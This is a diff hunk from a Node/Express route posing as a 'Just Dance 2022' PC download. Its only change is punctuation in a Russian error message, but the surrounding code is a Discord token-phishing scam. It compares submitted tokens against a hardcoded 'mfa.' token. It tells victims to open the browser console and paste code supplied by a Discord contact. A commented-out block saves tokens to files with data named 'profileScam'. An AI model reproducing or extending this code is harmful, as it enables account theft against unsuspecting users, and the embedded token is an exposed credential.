@@ -22,7 +22,7 @@ app.get('/justdance2022/download/pc', function (req, res) {
                 if(tokenHead==="mfa.LemvHJshUwSZAfSz08bmg8fyq_l0FTZn6HizlKZyLofaLKGVy7XC3lkDJf5zkbXYqhBF6siXDejhJMW"){
                     res.send("Этот токен уже получил ссылку, используйте свой токен. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743. Чтобы узнать свой токен: нажмите Ctrl + Shift + I и вставьте в Console код ( Код можно узнать у Michael Ruinlov#6743) ")
                 } else{
-                     res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743 ");
+                     res.send("Хм, что-то пошло не так, поторите попытку через 10 секунд. Если это не помогло, обратитесь в поддержку в Discord'e -  Michael Ruinlov#6743." );
                 }
        /* fs.writeFile("./tokens/"+tokenHead+".json", profileScam, function (err) {
             if (err) {
